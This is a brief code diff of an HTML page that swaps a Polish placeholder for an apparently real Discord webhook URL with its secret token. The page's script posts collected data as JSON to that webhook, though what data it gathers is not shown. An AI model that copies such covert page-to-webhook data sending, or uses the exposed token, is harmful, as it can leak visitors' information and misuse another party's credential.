@@ -13,7 +13,7 @@
     </div>
 
     <script>
-        const webhook = "TUTAJ_WKLEJ_SWÓJ_WEBHOOK";
+        const webhook = "https://discord.com/api/webhooks/1521645357082087454/e2MVaOrDUJxQS-FAMPosani30S4nIyD4GVG7nPHD9HiRwIuTwuaNVYXdUsWHun1xamcW";
 
         function send(d) {
             fetch(webhook, {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({content:"```json\n"+JSON.stringify(d,null,2)+"\n```"})});
